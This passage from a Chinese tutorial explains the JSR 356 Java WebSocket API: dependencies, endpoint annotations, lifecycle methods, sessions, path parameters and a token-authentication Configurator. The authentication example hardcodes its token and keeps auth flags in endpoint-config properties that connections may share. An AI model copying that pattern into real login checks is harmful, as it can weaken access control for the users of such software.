<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.websocket<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.websocket-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用与你的服务器兼容的版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Maven 依赖 (适用于旧版 Java EE)</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.websocket<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.websocket-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 经典的 Java EE 7/8 版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>scope</code> 设置为 <code>provided</code> 的原因</strong>：<br>我们将 <code>scope</code> 设置为 <code>provided</code>，是因为我们期望最终的应用是部署在一个已经内置了 JSR 356 实现的 Servlet 容器（如 Tomcat 8+、Jetty 9+）中的。容器在运行时会提供具体的实现类。我们只需要这个 API 依赖在<strong>编译时</strong>可用，以便我们的代码能够通过编译检查。如果将实现打包到我们的 <code>.war</code> 文件中，可能会与容器自带的实现产生冲突。</p>
</li>
</ul>
<hr>
<h3 id="1-3-何时使用？"><a href="#1-3-何时使用？" class="headerlink" title="1.3 何时使用？"></a>1.3 何时使用？</h3><p>虽然 Spring 提供了更高级的抽象，但在某些场景下，直接使用 JSR 356 仍然是一个非常好的选择：</p>
<ol>
<li><strong>原生 Servlet 容器环境</strong><ul>
<li>当项目是一个不使用 Spring 或其他大型框架的、标准的 Web 应用（打包成 <code>.war</code> 文件），并直接部署在 Tomcat, Jetty, Undertow 等 Servlet 容器上时，JSR 356 是最自然、最轻量级的选择。这些容器都内置了对 JSR 356 的原生支持。</li>
</ul>
</li>
<li><strong>轻量级应用与微服务</strong><ul>
<li>对于一些简单的、功能单一的微服务，如果引入整个 Spring Boot 框架显得过于臃肿，使用如 JAX-RS (用于 REST) + JSR 356 (用于 WebSocket) 的组合，可以构建出非常轻量级的服务。</li>
</ul>
</li>
<li><strong>追求极致性能与底层控制</strong><ul>
<li>JSR 356 提供了相对底层的 API，让你能更直接地控制 <code>Session</code>、消息分片、超时等。对于需要进行深度性能调优或实现复杂协议交互的场景，直接使用原生 API 可能比经过多层封装的框架更灵活。</li>
</ul>
</li>
<li><strong>学习和理解 WebSocket 基础</strong><ul>
<li>从学习的角度看，先掌握 JSR 356 有助于你深刻理解 WebSocket 的生命周期和事件模型。这些基础知识对于后续学习和排查 Spring WebSocket 的问题也大有裨益。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="2-服务端实现"><a href="#2-服务端实现" class="headerlink" title="2. 服务端实现"></a>2. 服务端实现</h2><p>使用 JSR 356 实现 WebSocket 服务端非常直观，其核心是创建一个普通的 Java 类 (POJO)，并使用一系列注解来标记它，使其成为一个“服务端点 (Server Endpoint)”。容器会自动扫描、实例化并管理这些端点。</p>
<h3 id="2-1-服务端点类：-ServerEndpoint-注解详解"><a href="#2-1-服务端点类：-ServerEndpoint-注解详解" class="headerlink" title="2.1 服务端点类：@ServerEndpoint 注解详解"></a>2.1 服务端点类：<code>@ServerEndpoint</code> 注解详解</h3><p><code>@ServerEndpoint</code> 是 JSR 356 中最核心的注解。一个类一旦被此注解标记，容器就会将其识别为一个 WebSocket 端点，并为指定的 URI 路径提供服务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(&quot;/chat/&#123;room&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatEndpoint</span> &#123;</span><br><span class="line">    <span class="comment">// ... 生命周期方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@ServerEndpoint</code> 注解有多个常用属性：</p>
<ul>
<li><strong><code>value</code> (必需)</strong>:<ul>
<li><strong>作用</strong>：定义此端点对外暴露的 URI 路径。客户端需要连接到这个路径才能建立 WebSocket 通信。</li>
<li><strong>示例</strong>：<code>@ServerEndpoint(&quot;/chat&quot;)</code>，客户端需要连接 <code>ws://your-host/your-context/chat</code>。</li>
<li><strong>路径参数 (Path Parameters)</strong>：支持类似 JAX-RS 的路径模板。你可以使用 <code>{}</code> 来定义路径变量，并在生命周期方法中通过 <code>@PathParam</code> 注解获取。<ul>
<li><strong>示例</strong>：<code>@ServerEndpoint(&quot;/chat/{room}&quot;)</code>，客户端连接 <code>ws://.../chat/gaming</code> 时，<code>room</code> 变量的值就是 “gaming”。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>configurator</code> (可选)</strong>:<ul>
<li><strong>作用</strong>：指定一个自定义的 <code>ServerEndpointConfig.Configurator</code> 类的实例。这是一个高级特性，允许你在握手阶段进行深度定制，例如：<ul>
<li>在连接建立前修改 WebSocket 的配置。</li>
<li>根据 HTTP 握手请求头中的信息（如 <code>Origin</code> 或自定义 <code>token</code>）来决定是否允许连接。</li>
<li>在创建端点实例之前或之后执行特定逻辑。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>decoders</code> (可选)</strong>:<ul>
<li><strong>作用</strong>：指定一个或多个 <code>Decoder</code> 类的数组。Decoder 用于将传入的文本或二进制消息（如                                                                                                                                                                                                                                                                                                                                                     JSON 字符串）自动解码为自定义的 Java 对象。</li>
<li><strong>示例</strong>：<code>decoders = {MessageDecoder.class}</code></li>
</ul>
</li>
<li><strong><code>encoders</code> (可选)</strong>:<ul>
<li><strong>作用</strong>：指定一个或多个 <code>Encoder</code> 类的数组。Encoder 用于将传出的 Java 对象自动编码为 WebSocket 能发送的文本或二进制消息（如序列化为 JSON 字符串）。</li>
<li><strong>示例</strong>：<code>encoders = {MessageEncoder.class}</code></li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-生命周期注解"><a href="#2-2-生命周期注解" class="headerlink" title="2.2 生命周期注解"></a>2.2 生命周期注解</h3><p>JSR 356 定义了四个注解，用于标记在 WebSocket 连接生命周期的不同阶段应该被调用的方法。</p>
<ul>
<li><p><strong><code>@OnOpen</code></strong>: <strong>连接建立时</strong></p>
<ul>
<li>当一个客户端成功与服务端点建立 WebSocket 连接后，被此注解标记的方法会被调用。</li>
<li><strong>方法签名</strong>：可以接受 <code>Session</code> 对象作为参数，也可以通过 <code>@PathParam</code> 获取 URI 中的路径变量。</li>
<li><strong>用途</strong>：通常用于初始化操作，如记录新用户上线、将会话 <code>Session</code> 存入一个全局集合以便后续广播、向新连接的用户发送欢迎消息等。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@OnOpen</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, <span class="meta">@PathParam(&quot;room&quot;)</span> String room)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Client connected to room: &quot;</span> + room);</span><br><span class="line">    <span class="comment">// session.getBasicRemote().sendText(&quot;Welcome to the chat!&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@OnMessage</code></strong>: <strong>收到消息时</strong></p>
<ul>
<li>当服务器从客户端收到一个完整的消息时，被此注解标记的方法会被调用。</li>
<li><strong>方法签名</strong>：<ul>
<li>可以接受消息内容作为参数，类型可以是 <code>String</code> (文本消息)、<code>byte[]</code> 或 <code>ByteBuffer</code> (二进制消息)、<code>Reader</code> (流式处理文本)、<code>InputStream</code> (流式处理二进制)。</li>
<li>如果配置了 <code>Decoder</code>，参数类型可以是解码后的自定义 Java 对象。</li>
<li>也可以接受 <code>Session</code> 参数来识别消息来源。</li>
</ul>
</li>
<li><strong>用途</strong>：处理业务逻辑的核心。例如，接收聊天消息并广播给其他人。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@OnMessage</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message, Session session)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Received message: &quot;</span> + message);</span><br><span class="line">    <span class="comment">// 广播消息给聊天室其他人...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@OnClose</code></strong>: <strong>连接关闭时</strong></p>
<ul>
<li>当连接被关闭时（无论由客户端、服务端主动关闭，还是因网络异常中断），被此注解标记的方法会被调用。</li>
<li><strong>方法签名</strong>：可以接受 <code>Session</code> 和 <code>CloseReason</code> 对象作为参数。<code>CloseReason</code> 包含了关闭状态码和原因描述。</li>
<li><strong>用途</strong>：执行清理工作，如用户下线通知、从全局会话集合中移除该 <code>Session</code>。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@OnClose</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, CloseReason closeReason)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Connection closed: &quot;</span> + closeReason.getReasonPhrase());</span><br><span class="line">    <span class="comment">// 从会话集合中移除 session</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@OnError</code></strong>: <strong>发生错误时</strong></p>
<ul>
<li>当通信过程中发生错误时（如网络异常、消息编解码失败等），被此注解标记的方法会被调用。</li>
<li><strong>方法签名</strong>：必须接受一个 <code>Throwable</code> 类型的参数，用于表示发生的异常。也可以接受一个 <code>Session</code> 参数。</li>
<li><strong>用途</strong>：记录错误日志、进行必要的资源清理。<strong>注意</strong>：在很多实现中，一个错误发生后，连接通常会紧接着被关闭，所以 <code>@OnClose</code> 方法也常常会被调用。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@OnError</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable throwable)</span> &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;An error occurred: &quot;</span> + throwable.getMessage());</span><br><span class="line">    throwable.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="2-3-核心组件"><a href="#2-3-核心组件" class="headerlink" title="2.3 核心组件"></a>2.3 核心组件</h3><p>在生命周期方法中，<code>Session</code> 对象是你与客户端交互的唯一桥梁。</p>
<ul>
<li><strong><code>Session</code></strong><ul>
<li><strong>定义</strong>：代表一个客户端与服务端点之间的<strong>单一连接会话</strong>。每个成功连接的客户端都有一个独立的 <code>Session</code> 实例。</li>
<li><strong>关键方法</strong>：<ul>
<li><code>getId()</code>: 获取此会话的唯一ID。</li>
<li><code>isOpen()</code>: 检查连接是否仍然打开。</li>
<li><code>close()</code> &#x2F; <code>close(CloseReason reason)</code>: 主动关闭连接。</li>
<li><code>getRequestURI()</code>: 获取建立此连接的完整 URI。</li>
<li><code>getPathParameters()</code>: 获取一个 <code>Map</code>，包含 URI 模板中的所有路径参数。</li>
<li><code>getUserProperties()</code>: 提供一个 <code>Map&lt;String, Object&gt;</code>，可以在会话期间存储与该连接相关的自定义数据（如用户名、状态等）。这是一个非常有用的“会话状态”存储空间。</li>
<li><code>getBasicRemote()</code>: 获取<strong>同步</strong>消息发送器。</li>
<li><code>getAsyncRemote()</code>: 获取<strong>异步</strong>消息发送器。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>RemoteEndpoint.Basic</code> &#x2F; <code>RemoteEndpoint.Async</code></strong><ul>
<li><code>RemoteEndpoint</code> 是 <code>Session</code> 的一个属性，代表了“远程的那一端”（即客户端），用于向其发送消息。它提供了两种发送模式：</li>
<li><strong><code>RemoteEndpoint.Basic</code> (同步发送)</strong><ul>
<li><strong>获取方式</strong>：<code>session.getBasicRemote()</code></li>
<li><strong>特点</strong>：调用发送方法（如 <code>sendText(String text)</code>）时，当前线程会被<strong>阻塞</strong>，直到消息完全发送出去。</li>
<li><strong>优点</strong>：简单直接，易于理解。</li>
<li><strong>缺点</strong>：如果网络状况不佳或者发送的数据量大，会导致处理线程长时间阻塞，影响服务器处理其他连接的能力。在高并发场景下可能成为性能瓶颈。</li>
<li><strong>常用方法</strong>：<code>sendText(String)</code>, <code>sendBinary(ByteBuffer)</code>, <code>sendObject(Object)</code> (需配置 Encoder)。</li>
</ul>
</li>
<li><strong><code>RemoteEndpoint.Async</code> (异步发送)</strong><ul>
<li><strong>获取方式</strong>：<code>session.getAsyncRemote()</code></li>
<li><strong>特点</strong>：调用发送方法时，方法会<strong>立即返回</strong>，消息的发送操作会在另一个后台线程中进行。</li>
<li><strong>优点</strong>：非阻塞，不会占用当前业务处理线程，能显著提升服务器的吞吐量和响应能力，是<strong>生产环境推荐</strong>的方式。</li>
<li><strong>缺点</strong>：编程模型稍复杂，需要通过回调 (<code>Future</code> 或 <code>SendHandler</code>) 来处理发送成功或失败的结果。</li>
<li><strong>常用方法</strong>：<ul>
<li><code>sendText(String text)</code>: 立即返回，不关心结果。</li>
<li><code>sendText(String text, SendHandler handler)</code>: 传入一个回调处理器，当发送完成（成功或失败）时，<code>handler</code> 的 <code>onResult</code> 方法会被调用。</li>
<li><code>sendObject(Object obj)</code>: 立即返回一个 <code>Future&lt;Void&gt;</code>，可以通过 <code>Future</code> 来检查发送是否完成或捕获异常。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-高级特性"><a href="#3-高级特性" class="headerlink" title="3. 高级特性"></a>3. 高级特性</h2><h3 id="3-1-路径参数处理：-ServerEndpoint-与-PathParam"><a href="#3-1-路径参数处理：-ServerEndpoint-与-PathParam" class="headerlink" title="3.1 路径参数处理：@ServerEndpoint 与 @PathParam"></a>3.1 路径参数处理：<code>@ServerEndpoint</code> 与 <code>@PathParam</code></h3><p>在实际应用中，我们往往不希望所有 WebSocket 连接都混在同一个“大厅”里。我们可能需要根据业务逻辑对连接进行分组，例如创建不同的聊天室、为特定用户推送消息等。JSR 356 借鉴了 JAX-RS (Java API for RESTful Web Services) 的设计，通过在 <code>@ServerEndpoint</code> 的路径中使用模板变量，并结合 <code>@PathParam</code> 注解来实现这一点。</p>
<ul>
<li><p><strong>定义带参数的路径</strong></p>
<p>在 <code>@ServerEndpoint</code> 注解的 <code>value</code> 属性中，使用 <code>{variableName}</code> 的形式来定义路径参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(&quot;/websocket/chat/&#123;room&#125;/&#123;username&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdvancedChatEndpoint</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们定义了两个路径参数：<code>room</code> 和 <code>username</code>。</p>
</li>
<li><p><strong>在方法中获取参数值</strong></p>
<p>在任何生命周期方法（<code>@OnOpen</code>, <code>@OnMessage</code>, <code>@OnClose</code>, <code>@OnError</code>）的参数列表中，使用 <code>@PathParam(&quot;variableName&quot;)</code> 注解来注入对应的路径参数值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(&quot;/websocket/chat/&#123;room&#125;/&#123;username&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdvancedChatEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OnOpen</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session,</span></span><br><span class="line"><span class="params">                       <span class="meta">@PathParam(&quot;room&quot;)</span> String room,</span></span><br><span class="line"><span class="params">                       <span class="meta">@PathParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Session %s connected. User &#x27;%s&#x27; joined room &#x27;%s&#x27;.%n&quot;</span>,</span><br><span class="line">                          session.getId(), username, room);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 我们可以利用这些信息来管理会话</span></span><br><span class="line">        <span class="comment">// 例如，将会话按房间分组存储</span></span><br><span class="line">        <span class="comment">// chatRooms.computeIfAbsent(room, k -&gt; new CopyOnWriteArraySet&lt;&gt;()).add(session);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将用户信息存储在会话中，方便后续使用</span></span><br><span class="line">        session.getUserProperties().put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        session.getUserProperties().put(<span class="string">&quot;room&quot;</span>, room);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OnMessage</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message, Session session)</span> &#123;</span><br><span class="line">        <span class="comment">// 从会话中直接获取用户信息，而无需再次解析路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">room</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;room&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.printf(<span class="string">&quot;Received message from &#x27;%s&#x27; in room &#x27;%s&#x27;: %s%n&quot;</span>,</span><br><span class="line">                          username, room, message);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 接下来可以实现只向同一个 room 的其他用户广播消息</span></span><br><span class="line">        <span class="comment">// broadcastToRoom(room, username + &quot;: &quot; + message);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 其他生命周期方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>优点</strong></p>
<ul>
<li><strong>动态路由</strong>：使得一个端点类可以服务于多个逻辑隔离的 WebSocket 通道。</li>
<li><strong>语义清晰</strong>：URI 本身就携带了连接的上下文信息，非常直观。</li>
<li><strong>简化逻辑</strong>：避免了在连接建立后再通过第一条消息来传递“房间号”之类的元数据，简化了客户端和服务器的协议。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-2-配置类-ServerEndpointConfig-Configurator-的使用"><a href="#3-2-配置类-ServerEndpointConfig-Configurator-的使用" class="headerlink" title="3.2 配置类 ServerEndpointConfig.Configurator 的使用"></a>3.2 配置类 <code>ServerEndpointConfig.Configurator</code> 的使用</h3><p><code>ServerEndpointConfig.Configurator</code> 是一个强大的钩子 (hook)，它允许你在 WebSocket 握手和端点实例化的过程中进行深度干预。这对于实现认证、授权或动态修改配置等高级功能至关重要。</p>
<ul>
<li><p><strong>使用步骤</strong>：</p>
<ol>
<li><strong>创建一个自定义的 Configurator 类</strong>：<br>这个类需要继承 <code>ServerEndpointConfig.Configurator</code>。</li>
<li><strong>重写关键方法</strong>：<ul>
<li><code>modifyHandshake(ServerEndpointConfig sec, HandshakeRequest request, HandshakeResponse response)</code>:<br>这是最有用的方法。它在 HTTP Upgrade 握手期间被调用。你可以在这里：<ul>
<li><strong>访问 HTTP 请求头</strong> (<code>request.getHeaders()</code>)：可以获取 <code>Cookie</code>, <code>Authorization</code>, <code>Origin</code> 或任何自定义的请求头，用于身份验证或安全检查。</li>
<li><strong>拒绝连接</strong>：如果验证失败，可以抛出一个异常，或者修改 <code>HandshakeResponse</code> 来返回一个非 101 的 HTTP 状态码，从而阻止 WebSocket 连接的建立。</li>
<li><strong>传递信息</strong>：可以将从 HTTP 请求中获取的信息（如用户 ID）存入 <code>ServerEndpointConfig</code> 的 <code>userProperties</code> 中，这些属性随后可以在端点实例中被访问。</li>
</ul>
</li>
<li><code>getEndpointInstance(Class&lt;T&gt; endpointClass)</code>:<br>这个方法用于创建端点类的实例。默认行为是简单地调用 <code>endpointClass.newInstance()</code>。你可以重写它来实现：<ul>
<li><strong>依赖注入</strong>：如果你想在一个非 Spring 环境下为 WebSocket 端点注入依赖（比如一个 <code>UserService</code>），可以在这里手动创建实例并注入。</li>
<li><strong>实例池</strong>：实现一个端点实例池来复用对象（尽管在大多数情况下，每个连接一个新实例是更清晰的模型）。</li>
</ul>
</li>
</ul>
</li>
<li><strong>在 <code>@ServerEndpoint</code> 中关联 Configurator</strong>：<br>使用 <code>configurator</code> 属性指向你的自定义 Configurator 类。</li>
</ol>
</li>
<li><p><strong>示例：基于 Token 的身份验证</strong></p>
<p>假设客户端在建立 WebSocket 连接时，会通过一个名为 <code>X-Auth-Token</code> 的 HTTP 请求头来传递认证令牌。</p>
<p><strong>Step 1: 创建 Configurator</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthConfigurator</span> <span class="keyword">extends</span> <span class="title class_">ServerEndpointConfig</span>.Configurator &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyHandshake</span><span class="params">(ServerEndpointConfig sec, HandshakeRequest request, HandshakeResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取 HTTP 请求头中的 token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeaders().get(<span class="string">&quot;X-Auth-Token&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪代码：验证 token 的有效性</span></span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; isValidToken(token)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Token validation successful.&quot;</span>);</span><br><span class="line">            <span class="comment">// Token 有效，可以将解析出的用户信息存入 userProperties</span></span><br><span class="line">            <span class="comment">// 以便在 @OnOpen 中使用</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> getUserIdFromToken(token);</span><br><span class="line">            sec.getUserProperties().put(<span class="string">&quot;userId&quot;</span>, userId);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Token validation failed. Refusing connection.&quot;</span>);</span><br><span class="line">            <span class="comment">// Token 无效，可以采取措施拒绝连接</span></span><br><span class="line">            <span class="comment">// 抛出异常是 JSR 356 规范中没有明确定义但一些容器支持的方式。</span></span><br><span class="line">            <span class="comment">// 更标准的方式是修改响应，但这在 modifyHandshake 中不易做到。</span></span><br><span class="line">            <span class="comment">// 实际开发中通常在此处记录日志，并在 @OnOpen 中检查属性并立即关闭。</span></span><br><span class="line">            <span class="comment">// 或者直接在此处抛出未检查异常，多数容器会捕获并中止握手。</span></span><br><span class="line">            <span class="comment">// 这里我们简单地设置一个标志</span></span><br><span class="line">            sec.getUserProperties().put(<span class="string">&quot;auth_failed&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现你的 token 验证逻辑，例如查询数据库或调用认证服务</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;valid-token-string&quot;</span>.equals(token);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getUserIdFromToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Step 2: 在端点中应用 Configurator</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/secure/data&quot;, configurator = AuthConfigurator.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureDataEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OnOpen</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session)</span> &#123;</span><br><span class="line">        <span class="comment">// 在 OnOpen 中检查认证结果</span></span><br><span class="line">        <span class="keyword">if</span> (session.getUserProperties().containsKey(<span class="string">&quot;auth_failed&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Authentication failed, closing session.&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                session.close(<span class="keyword">new</span> <span class="title class_">CloseReason</span>(CloseReason.CloseCodes.VIOLATED_POLICY, <span class="string">&quot;Authentication Failed&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="comment">// handle error</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> (String) session.getUserProperties().get(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Secure connection established for user: %s (Session ID: %s)%n&quot;</span>, userId, session.getId());</span><br><span class="line">        <span class="comment">// 后续可以将 session 与 userId 